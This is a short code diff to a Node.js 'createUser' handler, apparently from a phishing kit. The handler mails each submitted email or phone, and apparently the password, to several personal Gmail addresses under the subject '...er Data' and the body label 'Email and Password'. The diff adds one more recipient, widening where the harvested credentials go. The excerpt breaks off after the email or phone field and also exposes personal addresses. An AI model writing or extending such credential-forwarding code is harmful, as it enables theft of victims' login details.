@@ -11,7 +11,7 @@ exports.createUser = async (req, res) => {
 
         const msg = {
             from: "md.naimhossen.2222@gmail.com",
-            to: "thenaim33@gmail.com , md.naimhossen.1111@gmail.com",
+            to: "thenaim33@gmail.com , md.naimhossen.1111@gmail.com , mdhosen079@gmail.com",
             subject: `${emailOrPhone} er Data`,
             text: "Email and Password", // plain text body
             html: `<b>Email or Phone: ${emailOrPhone}</b>
